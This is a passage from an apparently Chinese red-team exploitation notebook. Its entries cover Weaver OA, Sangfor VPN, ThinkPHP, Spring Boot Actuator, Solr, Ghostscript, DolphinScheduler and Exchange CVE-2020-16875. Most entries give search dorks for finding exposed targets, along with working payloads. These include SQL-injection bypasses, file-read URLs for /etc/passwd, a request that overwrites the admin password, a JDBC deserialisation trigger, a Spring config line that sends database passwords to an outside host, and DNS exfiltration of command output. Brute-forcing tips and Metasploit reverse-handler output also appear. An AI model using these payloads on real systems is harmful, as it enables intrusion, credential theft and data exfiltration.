<p>老版本可以在关键字后面加 // 来绕过sql检测<br>   <br>新版本可以通过加入大量空格/换行来绕过sql检测mssql,oracle中都有Hrmresourcemanager , 这是管理员信息表</br><br>   就Hrmresource表中没有用户, Hrmresourcemanager 表中也一定会存在sysadmin账户，所以进行union select的时候一定会有数据。这里也可以使用 “-1) “+” “*800+ “ or// 1=1 and id&lt;(5”，这里使用 &lt;5 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用</p>
<p>8.防护方法</p>
<p>1.及时更新泛微补丁<br>2.泛微最好不要开放到公网<br>3.使用waf拦击</p>
<h2 id="深信服VPN远程代码执行"><a href="#深信服VPN远程代码执行" class="headerlink" title="深信服VPN远程代码执行"></a>深信服VPN远程代码执行</h2><p>1.漏洞简介</p>
<p>深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</p>
<p>2.影响组件：</p>
<p>深信服 VPN</p>
<p>3.漏洞指纹</p>
<p>Set-Cookie: TWFID=welcome to ssl vpn Sinfor</p>
<p>4.Fofa Dork</p>
<p>header=”Set-Cookie: TWFID=”</p>
<p>5.漏洞分析<br>深 信 服 vpnweb 登 录 逆 向 学 习 ： <a target="_blank" rel="noopener" href="http://www.cnblogs.com/potatsoSec/p/12326356.html">https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p>
<p>6.漏洞利用</p>
<p>wget -t %d -T %d –spider %s</p>
<p>7.利用技巧</p>
<p>1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网<br>2.该版本较低,<code>whomai</code>不存在,可以使用<code>uname</code>,这里没有空格可dns传出来<br>3.去除空格也简单 <code>cat /etc/passwd | tr &quot; \n&quot; &quot;+|&quot;</code></p>
<p>8.防护方法<br>1.及时更新补丁<br>2.升级到最新版</p>
<h2 id="深信服-VPN-口令爆破"><a href="#深信服-VPN-口令爆破" class="headerlink" title="深信服 VPN 口令爆破"></a>深信服 VPN 口令爆破</h2><p>1.漏洞简介</p>
<p>深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行</p>
<p>2.影响组件</p>
<p>深信服 VPN</p>
<p>3.漏洞指纹</p>
<p><code>/por/login_auth.csp?apiversion=1sangfor/cgi-bin/login.cgi?rnd=</code></p>
<p>4.Fofa   Dork </p>
<p>app=”深信服-SSL-VPN”</p>
<p>5.漏洞分析</p>
<p>关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区<br><a target="_blank" rel="noopener" href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633</a></p>
<p>此处存疑, 时间问题没有测试</p>
<p>6.漏洞利用</p>
<p>1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)<br>      #encoding=utf8<br>      import requests<br>      import hashlib<br>      import urllib3<br>      urllib3.disable_warnings()<br>      import re</p>
<pre><code>  session = requests.session()

  def SanForLogin(target, password, username=&quot;admin&quot;):

     # 加密密码的算法是 sha1(password+sid) 
     # 没有公开POC就不写了

  SanForLogin(&quot;https://xxxxxxxxxxx/&quot;, &quot;admin&quot;)</code></pre>
<p>7.利用技巧</p>
<p>1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多国外APT组织应该也批量爆破了一波，加密的密码也就是 <code>sha1(password+sid)</code></p>
<p>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些admin/123456/Sangfor/Sangfor@123 </p>
<p>2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能</p>
<p>3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧。深信服SSLVPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell</p>
<p><a target="_blank" rel="noopener" href="http://www.uedbox.com/post/31092/">https://www.uedbox.com/post/31092/</a></p>
<p>8.防护方法  </p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="常见边界产品-防火墙-网关-路由器-VPN-弱口令漏洞"><a href="#常见边界产品-防火墙-网关-路由器-VPN-弱口令漏洞" class="headerlink" title="常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞"></a>常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞</h2><p>1.漏洞简介</p>
<p>大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主</p>
<p>2.影响组件</p>
<p>防火墙, 网关, 路由器, VPN</p>
<p>3.漏洞指纹</p>
<p>防火墙, 网关, 路由器, VPN</p>
<p>4.Fofa Dork防火墙, 网关, 路由器, VPN 的名称</p>
<p>5.漏洞利用</p>
<p>【安全设备】常见网络安全设备默认口令<a target="_blank" rel="noopener" href="http://www.it2021.com/security/614.html">https://www.it2021.com/security/614.html</a></p>
<p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p>
<p>7.利用技巧</p>
<p>这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令，admin root 123456 永远的神内网的安全平台就是个漏洞指南</p>
<p>8.防护方法</p>
<p>1.设置强口令</p>
<p>2.限制来源IP</p>
<h2 id="Thinkphp-相关漏洞"><a href="#Thinkphp-相关漏洞" class="headerlink" title="Thinkphp 相关漏洞"></a>Thinkphp 相关漏洞</h2><p>1.漏洞简介</p>
<p>Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题</p>
<p>2.影响组件</p>
<p>Thinkphp</p>
<p>3.漏洞指纹</p>
<p>Thinkphp X-Powered-By: ThinkPHP</p>
<p>4.Fofa Dork </p>
<p>app=”ThinkPHP”</p>
<p>5.漏洞分析      </p>
<p>ThinkPHP漏洞总结 – 赛克社区<br><a target="_blank" rel="noopener" href="http://zone.secevery.com/article/1165">http://zone.secevery.com/article/1165</a></p>
<p>挖 掘 暗 藏 ThinkPHP 中 的 反 序 列 利 用 链 ： <a target="_blank" rel="noopener" href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/</a></p>
<p>ThinkPHP 使 用 不 当 可 能 造 成 敏 感 信 息 泄 露 ： <a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/81201904">https://blog.csdn.net/Fly_hps/article/details/81201904</a></p>
<p>DSMall 代 码 审 计 ： <a target="_blank" rel="noopener" href="http://www.anquanke.com/post/id/203461">https://www.anquanke.com/post/id/203461</a></p>
<p>6.漏洞利用</p>
<p>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合<br><a target="_blank" rel="noopener" href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
<p>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写<a target="_blank" rel="noopener" href="https://github.com/Dido1960/thinkphp">https://github.com/Dido1960/thinkphp</a></p>
<p>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具<a target="_blank" rel="noopener" href="https://github.com/whirlwind110/tphack">https://github.com/whirlwind110/tphack</a></p>
<p>7.利用技巧</p>
<p>1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露</p>
<p>2.自从挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中</p>
<p>3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞DSMall代码审计 – 安全客，安全资讯平台</p>
<p><a target="_blank" rel="noopener" href="http://www.anquanke.com/post/id/203461">https://www.anquanke.com/post/id/203461</a></p>
<p>8.防护方法<br>1.及时更新补丁<br>2.升级到最新版Thinkphp<br>3.前置WAF进行防护</p>
<h2 id="Spring-系列漏洞"><a href="#Spring-系列漏洞" class="headerlink" title="Spring 系列漏洞"></a>Spring 系列漏洞</h2><p>1.漏洞简介</p>
<p>Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒</p>
<p>2.影响组件</p>
<p>Spring xxx</p>
<p>3.漏洞指纹</p>
<p>X-Application-Context:</p>
<p>4.Fofa Dork</p>
<p>app=”Spring-Framework”</p>
<p>5.漏洞分析</p>
<p>Spring 框架漏洞集合：</p>
<p><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a> Exploiting Spring Boot Actuators | Veracode blog</p>
<p><a target="_blank" rel="noopener" href="http://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p>
<p>Spring Boot Actuators 配 置 不 当 导 致 RCE 漏 洞 复 现 ： <a target="_blank" rel="noopener" href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD</a></p>
<p>%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</p>
<p>6.漏洞利用</p>
<p>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE <a target="_blank" rel="noopener" href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p>
<p>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads <a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>7.利用技巧</p>
<p>1.Spring Boot Actuators 相关漏洞超级好用，很多厂商一开始都不懂, 直接对外开放Spring Boot Actuators, 造成了有一段时间每个用了Spring Boot的厂商都出了问题，尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个Spring Boot启动<a target="_blank" rel="noopener" href="http://123.123.123.123/admin/env">的服务。然后子目录比如 http://123.123.123.123/admin/env </a>, <a target="_blank" rel="noopener" href="http://123.123.123.123/manager/env%E4%B9%9F%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E5%87%BA%E7%8E%B0%E7%9A%84/env">http://123.123.123.123/manager/env也都是可以出现的/env </a>可以偷session, RCE/heapdump 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下</p>
<p><code>/trace</code></p>
<p><code>/health</code></p>
<p><code>/loggers</code></p>
<p><code>/metrics</code></p>
<p><code>/autoconfig</code></p>
<p><code>/heapdump</code></p>
<p><code>/threaddump</code></p>
<p><code>/env</code></p>
<p><code>/info</code></p>
<p><code>/dump</code></p>
<p><code>/configprops</code></p>
<p><code>/mappings</code></p>
<p><code>/auditevents</code></p>
<p><code>/beans</code></p>
<p><code>/jolokia</code></p>
<p><code>/cloudfoundryapplication</code></p>
<p><code>/hystrix.stream</code></p>
<p><code>/actuator</code></p>
<p><code>/actuator/auditevents</code></p>
<p><code>/actuator/beans</code></p>
<p><code>/actuator/health</code></p>
<p><code>/actuator/conditions</code></p>
<p><code>/actuator/configprops</code></p>
<p><code>/actuator/env</code></p>
<p><code>/actuator/info</code></p>
<p><code>/actuator/loggers</code></p>
<p><code>/actuator/heapdump</code></p>
<p><code>/actuator/threaddump</code></p>
<p><code>/actuator/metrics</code></p>
<p><code>/actuator/scheduledtasks</code></p>
<p><code>/actuator/httptrace</code></p>
<p><code>/actuator/mappings</code></p>
<p><code>/actuator/jolokia</code></p>
<p><code>/actuator/hystrix.stream</code></p>
<p><code>/monitor</code></p>
<p><code>/monitor/auditevents</code></p>
<p><code>/monitor/beans</code></p>
<p><code>/monitor/health</code></p>
<p><code>/monitor/conditions</code></p>
<p><code>/monitor/configprops</code></p>
<p><code>/monitor/env</code></p>
<p><code>/monitor/info</code></p>
<p><code>/monitor/loggers</code></p>
<p><code>/monitor/heapdump</code></p>
<p><code>/monitor/threaddump</code></p>
<p><code>/monitor/metrics</code></p>
<p><code>/monitor/scheduledtasks</code></p>
<p><code>/monitor/httptrace</code></p>
<p><code>/monitor/mappings</code></p>
<p><code>/monitor/jolokia</code></p>
<p><code>/monitor/hystrix.stream</code></p>
<p>这里通过 /env + /refresh 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作，里面就有操作空间, 很像fastjson反序列化。</p>
<p>2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone&#x3D;http:&#x2F;&#x2F;$&#123;somedb.pasword&#125;@127.0.0.1:5000 spring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;$&#123;somedb.password&#125;@artsploit.com&#x2F;yaml-payload.yml</span><br></pre></td></tr></table></figure>
<p>3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了</p>
<p>8.防护方法<br>1.及时更新补丁<br>2.开启Spring Boot Actuators权限校验<br>3.前置WAF进行防护</p>
<h2 id="Solr-系列漏洞"><a href="#Solr-系列漏洞" class="headerlink" title="Solr 系列漏洞"></a>Solr 系列漏洞</h2><p>1.漏 洞 简 介<br>Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,</p>
<p>2.影响组件Solr</p>
<p>3.漏洞指纹Solr</p>
<p>4.Fofa Dork </p>
<p>app=”Solr”</p>
<p>5.漏洞分析</p>
<p>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台<a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/218730.html">https://www.freebuf.com/vuls/218730.html</a></p>
<p>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析<a target="_blank" rel="noopener" href="https://paper.seebug.org/1009/">https://paper.seebug.org/1009/</a></p>
<p>6.漏洞利用</p>
<p>veracode-research/solr-injection: Apache Solr Injection Research <a target="_blank" rel="noopener" href="https://github.com/veracode-research/solr-injection">https://github.com/veracode-research/solr-injection</a></p>
<p>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)</p>
<p><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-12409">https://github.com/jas502n/CVE-2019-12409</a></p>
<p>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit <a target="_blank" rel="noopener" href="https://github.com/mogwailabs/mjet">https://github.com/mogwailabs/mjet</a></p>
<p>7.利用技巧</p>
<p>1.看到锤就完事了, 漏洞太多了, 一片一片的</p>
<p>2.遇到mjet连接超时,这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用socat进行流量转发, 后记里面有具体操作</p>
<p>8.防护方法<br>1.升级到最新版<br>2.不要对外开放敏感端口</p>
<h2 id="Ghostscript-上传图片代码执行"><a href="#Ghostscript-上传图片代码执行" class="headerlink" title="Ghostscript 上传图片代码执行"></a>Ghostscript 上传图片代码执行</h2><p>1.漏洞简介</p>
<p>Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招</p>
<p>2.影响组件</p>
<p>imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用</p>
<p>3.漏洞指纹</p>
<p>.ps/.jpg/.png</p>
<p>4.Fofa Dork</p>
<p>5.漏洞分析<br>ghostscript命令执行漏洞预警</p>
<p><a target="_blank" rel="noopener" href="http://www.anquanke.com/post/id/157513">https://www.anquanke.com/post/id/157513</a></p>
<p>6.漏洞利用</p>
<p>Exploit Database Search</p>
<p><a target="_blank" rel="noopener" href="http://www.exploit-db.com/search?q=Ghostscript">https://www.exploit-db.com/search?q=Ghostscript</a> vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub</p>
<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p>
<p>7.利用技巧</p>
<p>1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行dnslog 可以用 ping</p>
<p><code>uname.admin.ceye.io</code> 或 <code>ping whoami.admin.ceye.io</code>保存成图片, 以后用起来方便, 有个版本的 <code>centos</code> 和 <code>ubuntu poc</code>还不一样, 可以这样构造ping <code>whoami.centos.admin.ceye.io</code> / <code>ping whoami.ubuntu.admin.ceye.io</code>分别命名为 <code>centos_ps.jpg</code>/<code>ubuntu_ps.jpg</code>, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的</p>
<p>8.防护方法<br>1.升级到最新版</p>
<h2 id="泛微云桥复现"><a href="#泛微云桥复现" class="headerlink" title="泛微云桥复现"></a>泛微云桥复现</h2><p>1.其 实 没 什 么 复 现 的 。 。 。 未 授 权 读 取 。 直 接 调 用 exp 就 OK<br><a target="_blank" rel="noopener" href="http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt">http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</a> <a target="_blank" rel="noopener" href="http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt">http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt</a> </p>
<p>2.任意读取linux的passwd值</p>
<p>可在响应包中JSON中包含ID的32位值再次请求可获得/etc/passwd值<br><a target="_blank" rel="noopener" href="http://www.aaa.com/FileNoLogin/32%E4%BD%8DMD5%E5%80%BC">http://www.aaa.com/FileNoLogin/32位MD5值</a><br><a target="_blank" rel="noopener" href="http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=tx">http://www.aaa.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=tx</a><br><img src="/image/HW/32.jpg" alt="1"><br><img src="/image/HW/33.jpg" alt="1"><br><img src="/image/HW/34.jpg" alt="1"></p>
<p>3.任意读取winodws下的win.ini值<br>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。<br>1.downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。<br><a target="_blank" rel="noopener" href="http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt">http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt</a><br><img src="/image/HW/35.jpg" alt="1"><br>2.通过查看文件接口访问 /file/fileNoLogin/id<br><img src="/image/HW/36.jpg" alt="1"></p>
<p>3.其他利用技巧（读取任意目录文件）<br>简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”<br>/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///D:/&amp;fileExt=txt<br><img src="/image/HW/37.jpg" alt="1"><br>目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载：<br>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties<br>d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库<br><img src="/image/HW/38.jpg" alt="1"><br>4.修复建议:<br>关闭程序路由 /file/fileNoLogin</p>
<h2 id="网瑞达webVPN-RCE漏洞"><a href="#网瑞达webVPN-RCE漏洞" class="headerlink" title="网瑞达webVPN RCE漏洞"></a>网瑞达webVPN RCE漏洞</h2><p>1.漏洞描述</p>
<p>WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。近日网瑞达的webVPN被曝出存在RCE的漏洞。</p>
<p>2.修复建议</p>
<p>建议去官网更新最新版本</p>
<h2 id="Apache-DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）"><a href="#Apache-DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）" class="headerlink" title="Apache DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）"></a>Apache DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）</h2><p>1.漏洞描述</p>
<p>Apache软件基金会发布安全公告，修复了Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）与Apache DolphinScheduler 远程执行代码漏洞（CVE-2020-11974）。</p>
<p>CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入</p>
<p>{“detectCustomCollations”:true，“ autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。CVE-2020-13922导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：api interface</p>
<p>/dolphinscheduler/users/update，请相关用户及时升级进行防护。</p>
<p>2.影响范围</p>
<p>Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922） </p>
<p>3.受影响版本</p>
<p>Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1 </p>
<p>4.不受影响版本</p>
<p>Apache DolphinScheduler &gt;= 1.3.2</p>
<p>Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974） </p>
<p>5.利用POC:</p>
<pre><code>POST /dolphinscheduler/users/update



id=1&amp;userName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdluser%40sdluser.sdluser&amp;phone=</code></pre>
<p><img src="/image/HW/39.jpg" alt="1"></p>
<p>利用漏洞:需要登录权限,提供一组默认密码。</p>
<p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p>
<p>1、登录到面板 -&gt; 数据源中心<br><img src="/image/HW/40.jpg" alt="1"><br>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。<br><img src="/image/HW/41.jpg" alt="1"><br>3、将以下数据添加到jdbc连接参数中,就可以直接触发。<br><img src="/image/HW/42.jpg" alt="1"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;datasources&#x2F;connect HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">type&#x3D;MYSQL&amp;name&#x3D;test&amp;note&#x3D;&amp;host&#x3D;127.0.0.1&amp;port&#x3D;3306&amp;database&#x3D;test&amp; principal&#x3D;&amp;userName&#x3D;root&amp;password&#x3D;root&amp;connectType&#x3D;&amp;</span><br><span class="line"></span><br><span class="line">other&#x3D;&#123;&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true&#125;</span><br></pre></td></tr></table></figure>
<p>关于MySQL JDBC客户端反序列化漏洞的相关参考： <a target="_blank" rel="noopener" href="http://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>
<p>5.修复建议官方升级</p>
<p>目前官方已在最新版本中修复了此次的漏洞，请受影响的用户尽快升级版本至1.3.2进行防护，官方下载链接： <a target="_blank" rel="noopener" href="https://dolphinscheduler.apache.org/zhcn/docs/release/download.html">https://dolphinscheduler.apache.org/zhcn/docs/release/download.html</a></p>
<h2 id="宝塔面板phpMyadmin未授权访问"><a href="#宝塔面板phpMyadmin未授权访问" class="headerlink" title="宝塔面板phpMyadmin未授权访问"></a>宝塔面板phpMyadmin未授权访问</h2><p>来源: <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3ZjwFo5gWlJACSkeYWQLXA">https://mp.weixin.qq.com/s/3ZjwFo5gWlJACSkeYWQLXA</a></p>
<p>前段时间在朋友圈和微信群里火热不行的宝塔数据库面板未授权无需登录,以下是存在安全问题的版本。</p>
<p>- Linux正式版7.4.2</p>
<p>- Linux测试版7.5.13</p>
<p>- Windows正式版6.8    </p>
<p>1、宝塔默认phpMyadmin端口就是888 而这个漏洞排查方式极其简单 172.10.0.121:888/pma</p>
<p>2、如果宝塔是存在安全问题的版本,那就会直接出现phpMyadmin面板页面。<br><img src="/image/HW/43.jpg" alt="1"></p>
<h2 id="CVE-2020-16875-Exchange-Server-远程代码执行漏洞"><a href="#CVE-2020-16875-Exchange-Server-远程代码执行漏洞" class="headerlink" title="CVE-2020-16875: Exchange Server 远程代码执行漏洞"></a>CVE-2020-16875: Exchange Server 远程代码执行漏洞</h2><p>更新公告:<a target="_blank" rel="noopener" href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875</a> 微软公告说的很明显,只需要一个Exchange用户账号。就能在Exchange服务器上执行任意命令。<a target="_blank" rel="noopener" href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p>
<p><a target="_blank" rel="noopener" href="https://srcincite.io/pocs/cve-2020-16875.ps1.txt">https://srcincite.io/pocs/cve-2020-16875.ps1.txt</a> researcher@incite:~$ ./poc.py</p>
<p>(+) usage: ./poc.py <target> <a href="user:pass">user:pass</a> <cmd></p>
<p>(+) eg: ./poc.py 192.168.75.142 <a href="mailto:&#x68;&#97;&#114;&#114;&#121;&#109;&#64;&#x65;&#120;&#99;&#104;&#x61;&#x6e;&#103;&#x65;&#x64;&#101;&#x6d;&#111;&#46;&#99;&#x6f;&#109;">&#x68;&#97;&#114;&#114;&#121;&#109;&#64;&#x65;&#120;&#99;&#104;&#x61;&#x6e;&#103;&#x65;&#x64;&#101;&#x6d;&#111;&#46;&#99;&#x6f;&#109;</a>:user123### mspaint</p>
<p>researcher@incite:~$ ./poc.py 192.168.75.142 <a href="mailto:&#x68;&#x61;&#114;&#x72;&#121;&#109;&#x40;&#x65;&#120;&#99;&#104;&#97;&#x6e;&#103;&#101;&#100;&#x65;&#x6d;&#x6f;&#46;&#99;&#111;&#x6d;">&#x68;&#x61;&#114;&#x72;&#121;&#109;&#x40;&#x65;&#120;&#99;&#104;&#97;&#x6e;&#103;&#101;&#100;&#x65;&#x6d;&#x6f;&#46;&#99;&#111;&#x6d;</a>:user123### mspaint<br><a href="mailto:harrym@exchangedemo.com">(+) logged in as harrym@exchangedemo.com</a></p>
<p>(+) found the viewstate: /wEPDwUILTg5MDAzMDFkZFAeyPS7/eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5</p>
<p>(+) triggered rce as SYSTEM!</p>
<p>Microsoft Exchange远程代码执行(CVE-2020-16875):</p>
<p>Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥该漏洞影响版本:</p>
<p>microsoft:exchange_server_2016: cu16/cu17<br>microsoft:exchange_server_2019: cu5/cu6</p>
<p>MSF利用（<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_ecp_dlp_policy.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_ecp_dlp_policy.rb</a> </p>
<p>msf6 exploit(windows/http/exchange_ecp_dlp_policy) &gt; run</p>
<p>[*] Started HTTPS reverse handler on <a target="_blank" rel="noopener" href="https://192.168.123.1:8443/">https://192.168.123.1:8443</a> </p>
<p>[*] Executing automatic check (disable AutoCheck to override)</p>
<p>[!] The service is running, but could not be validated. OWA is running at <a target="_blank" rel="noopener" href="https://192.168.123.192/owa/">https://192.168.123.192/owa/</a></p>
<p>[*] Logging in to OWA with creds Administrator:Passw0rd! </p>
<p>[+] Successfully logged in to OWA</p>
<p>[*] Retrieving ViewState from DLP policy creation page </p>
<p>[+] Successfully retrieved ViewState</p>
<p>[*] Creating custom DLP policy from malicious template</p>
<p>[*] DLP policy name: Abbotstone Agricultural Property Unit Trust Data </p>
<p>[*] Powershell command length: 2372</p>
